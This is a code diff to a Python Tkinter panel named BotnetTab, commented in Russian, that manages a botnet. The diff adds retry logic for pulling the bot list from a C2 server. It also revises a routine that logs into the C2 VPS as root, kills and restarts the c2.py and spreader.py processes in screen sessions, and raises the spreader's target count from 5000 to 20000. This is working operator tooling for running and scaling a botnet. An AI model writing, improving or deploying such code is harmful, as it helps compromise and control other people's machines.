@@ -186,7 +186,7 @@ class BotnetTab(ttk.Frame):
                 self.spread_log.insert(tk.END, f"[!] C2 error: {e}\n")
         threading.Thread(target=check, daemon=True).start()
 
-    # ----- Обновление списка ботов -----
+    # ----- Обновление списка ботов (с 3 попытками) -----
     def _auto_refresh(self):
         self.refresh_bots()
         self.after(5000, self._auto_refresh)
@@ -199,27 +199,31 @@ class BotnetTab(ttk.Frame):
         messagebox.showinfo("Проверка", "Запрос отправлен. Статусы обновятся через несколько секунд.")
 
     def _fetch_bots(self):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(30)
-            sock.connect((self.c2_host, self.c2_port))
-            sock.sendall(b"list\n")
-            data = b""
-            while True:
-                chunk = sock.recv(4096)
-                if not chunk:
-                    break
-                data += chunk
-            sock.close()
-            if not data:
-                raise Exception("empty response")
-            bots = json.loads(data)
-            self.after(0, self._update_tree_safe, bots)
-        except Exception as e:
-            now = time.time()
-            if now - self._last_fetch_error > 10:
-                self.spread_log.insert(tk.END, f"[!] Bot list update error: {e}\n")
-                self._last_fetch_error = now
+        for attempt in range(3):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(10)
+                sock.connect((self.c2_host, self.c2_port))
+                sock.sendall(b"list\n")
+                data = b""
+                while True:
+                    chunk = sock.recv(4096)
+                    if not chunk:
+                        break
+                    data += chunk
+                sock.close()
+                if not data:
+                    raise Exception("empty response")
+                bots = json.loads(data)
+                self.after(0, self._update_tree_safe, bots)
+                return
+            except Exception as e:
+                if attempt == 2:
+                    now = time.time()
+                    if now - self._last_fetch_error > 10:
+                        self.spread_log.insert(tk.END, f"[!] Bot list update error: {e}\n")
+                        self._last_fetch_error = now
+                time.sleep(2)
 
     def _update_tree_safe(self, bots):
         selected_ips = [self.tree.item(i, 'values')[0] for i in self.tree.selection()]
@@ -332,7 +336,7 @@ class BotnetTab(ttk.Frame):
                 self.spread_log.insert(tk.END, f"[!] Ошибка VPS: {e}\n")
         threading.Thread(target=run, daemon=True).start()
 
-    # ----- Обновление VPS (на основе screen) -----
+    # ----- Обновление VPS (screen) -----
     def update_vps(self):
         if not self.vps_pass:
             self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
@@ -347,7 +351,7 @@ class BotnetTab(ttk.Frame):
                 client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=10)
 
                 # Остановка старых screen-сессий и процессов
-                stop_cmd = "pkill -f botnet/c2.py; pkill -f botnet/spreader.py; screen -S c2 -X quit; screen -S spreader -X quit"
+                stop_cmd = "screen -ls | grep -E 'c2|spreader' | awk -F. '{print $1}' | xargs -I {} screen -S {} -X quit 2>/dev/null; pkill -9 -f botnet/c2.py; pkill -9 -f botnet/spreader.py"
                 client.exec_command(stop_cmd)
 
                 # git pull
@@ -357,14 +361,12 @@ class BotnetTab(ttk.Frame):
                 err = stderr.read().decode()
                 self.spread_log.insert(tk.END, out + "\n" + err + "\n")
 
-                # Запуск C2 в screen-сессии
-                start_c2 = "cd /root/c2 && screen -dmS c2 python3 botnet/c2.py"
+                # Запуск C2 и спредера в screen
+                start_c2 = "cd /root/c2 && screen -dmS c2 python3 /root/c2/botnet/c2.py"
+                start_spreader = "cd /root/c2 && screen -dmS spreader python3 -u /root/c2/botnet/spreader.py --count 20000"
                 client.exec_command(start_c2)
-                # Запуск спредера в screen-сессии
-                start_spreader = "cd /root/c2 && screen -dmS spreader python3 -u botnet/spreader.py --count 5000"
                 client.exec_command(start_spreader)
 
-                # Небольшая пауза и проверка портов
                 time.sleep(3)
                 check_cmd = "ss -tlnp | grep 80"
                 stdin, stdout, stderr = client.exec_command(check_cmd)
@@ -372,8 +374,6 @@ class BotnetTab(ttk.Frame):
                 self.spread_log.insert(tk.END, f"Ports:\n{port_info}")
                 if "80" in port_info:
                     self.spread_log.insert(tk.END, "[+] C2 запущен успешно\n")
-                else:
-                    self.spread_log.insert(tk.END, "[!] Возможно C2 не запустился, проверьте логи на VPS\n")
                 client.close()
             except Exception as e:
                 self.spread_log.insert(tk.END, f"[!] Ошибка обновления VPS: {e}\n")
